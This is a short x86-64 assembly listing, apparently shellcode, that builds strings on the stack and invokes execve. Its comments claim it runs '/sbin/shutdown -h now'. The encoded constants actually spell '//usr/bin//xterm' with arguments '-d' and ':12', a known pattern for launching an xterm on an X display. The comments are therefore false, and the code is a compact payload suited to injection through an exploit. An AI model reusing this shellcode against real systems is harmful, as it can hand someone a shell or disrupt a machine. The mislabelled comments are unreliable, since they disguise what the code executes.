global _start

_start:

xor rax, rax
xor rdx, rdx 

push rax
push byte 0x32
push word 0x313a ; now
mov rbx, rsp

push rax
push word 0x642d ;-h
mov rcx, rsp

push rax
mov r10, 0x6d726574782f2f6e ; /sbin/shutdown
mov r8, 0x69622f7273752f2f
push r10
push r8
mov rdi, rsp

push rdx
push rbx
push rcx
push rdi
mov rsi, rsp

add rax, 59
syscall

